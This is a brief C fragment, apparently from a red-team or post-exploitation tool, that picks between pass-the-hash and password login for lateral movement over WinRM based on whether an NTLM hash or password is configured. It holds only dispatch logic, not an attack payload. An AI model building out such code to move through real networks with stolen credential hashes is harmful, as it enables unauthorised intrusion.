    *success = 0;
    if (cfg->ntlm_hash[0] && !cfg->password[0])
        return lateral_winrm_pth(cfg, output, output_cap, success);
    if (!cfg->username[0] || !cfg->password[0]) {
        snprintf(output, output_cap, "winrm requires username+password or username+ntlm_hash");
        return 1;
    }
    return lateral_winrm_password(cfg, output, output_cap, success);
}
